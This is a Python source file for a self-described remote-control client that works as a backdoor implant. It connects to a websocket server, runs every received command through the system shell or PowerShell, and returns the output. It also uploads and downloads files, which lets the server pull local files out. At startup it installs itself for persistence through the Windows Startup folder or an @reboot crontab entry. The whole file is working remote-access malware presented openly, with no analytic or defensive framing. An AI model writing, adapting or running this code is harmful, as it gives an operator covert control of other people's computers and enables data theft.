# Cliente (Remote Control)
import asyncio
import websockets
import subprocess
import logging
import base64
import os
import sys
import shutil

logging.basicConfig(level=logging.INFO)

class WebSocketClient:
    def __init__(self, uri):
        self.uri = uri

    async def connect(self):
        while True:
            try:
                async with websockets.connect(self.uri) as websocket:
                    logging.info("Connected to the server")
                    await self.handle_messages(websocket)
            except websockets.ConnectionClosed as e:
                logging.error(f"Connection closed: {e}, retrying in 2 seconds...")
                await asyncio.sleep(2)
            except Exception as e:
                logging.error(f"Error: {e}")
                await asyncio.sleep(2)

    async def handle_messages(self, websocket):
        while True:
            try:
                command = await websocket.recv()
                logging.info(f"Received command: {command}")

                if command.startswith("UPLOAD "):
                    await self.handle_file_upload(command, websocket)
                elif command.startswith("DOWNLOAD "):
                    await self.handle_file_download(command, websocket)
                else:
                    await self.execute_command(command, websocket)
            except websockets.ConnectionClosed as e:
                logging.error(f"Connection closed while receiving command: {e}")
                break
            except Exception as e:
                logging.error(f"Error while handling messages: {e}")
                break

    async def execute_command(self, command, websocket):
        try:
            if sys.platform == "win32":
                result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True, timeout=20)
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=20)
            await self.send_response(websocket, result)
        except subprocess.TimeoutExpired:
            await websocket.send("Error: Command execution timed out")
            logging.error(f"Command execution timed out: {command}")
        except Exception as e:
            await websocket.send(f"Error: Failed to execute command: {e}")
            logging.error(f"Failed to execute command: {command}, Error: {e}")

    async def handle_file_upload(self, command, websocket):
        try:
            _, filename = command.split(" ", 1)
            file_data = await websocket.recv()
            decoded_data = base64.b64decode(file_data)
            with open(filename, "wb") as f:
                f.write(decoded_data)
            await websocket.send(f"File {filename} uploaded successfully.")
            logging.info(f"File {filename} uploaded successfully.")
        except Exception as e:
            await websocket.send(f"Error: Failed to upload file: {e}")
            logging.error(f"Failed to upload file {filename}: {e}")

    async def handle_file_download(self, command, websocket):
        try:
            _, filename = command.split(" ", 1)
            if os.path.exists(filename):
                with open(filename, "rb") as f:
                    file_data = f.read()
                encoded_data = base64.b64encode(file_data).decode()
                await websocket.send(encoded_data)
                logging.info(f"File {filename} sent to server.")
            else:
                await websocket.send(f"Error: File {filename} not found.")
                logging.error(f"File {filename} not found.")
        except Exception as e:
            await websocket.send(f"Error: Failed to download file: {e}")
            logging.error(f"Failed to download file {filename}: {e}")

    async def send_response(self, websocket, result):
        response_message = ""
        if result.stdout:
            response_message += f"Output: {result.stdout}\n"
        if result.stderr:
            response_message += f"Error: {result.stderr}\n"
        if response_message:
            try:
                await websocket.send(response_message.strip())
                logging.info(f"Sent response to server: {response_message.strip()}")
            except websockets.ConnectionClosed as e:
                logging.error(f"Connection closed while sending response: {e}")
            except Exception as e:
                logging.error(f"Error while sending response: {e}")

    def setup_persistence(self):
        try:
            if sys.platform == "win32":
                # Configurar persistencia en Windows
                script_path = os.path.abspath(sys.argv[0])
                startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\Windows\Start Menu\Programs\Startup')
                shutil.copy(script_path, startup_folder)
                logging.info(f"Persistence setup on Windows: {startup_folder}")
            elif sys.platform == "linux" or sys.platform == "linux2":
                # Configurar persistencia en Linux
                script_path = os.path.abspath(sys.argv[0])
                cron_job = f"@reboot python3 {script_path}"
                os.system(f'(crontab -l; echo "{cron_job}") | crontab -')
                logging.info("Persistence setup on Linux using cron job.")
            else:
                logging.warning("Persistence setup not supported for this OS.")
        except Exception as e:
            logging.error(f"Failed to setup persistence: {e}")

    async def run(self):
        self.setup_persistence()
        await self.connect()

if __name__ == "__main__":
    client = WebSocketClient("ws://localhost:8000/ws")
    asyncio.run(client.run())
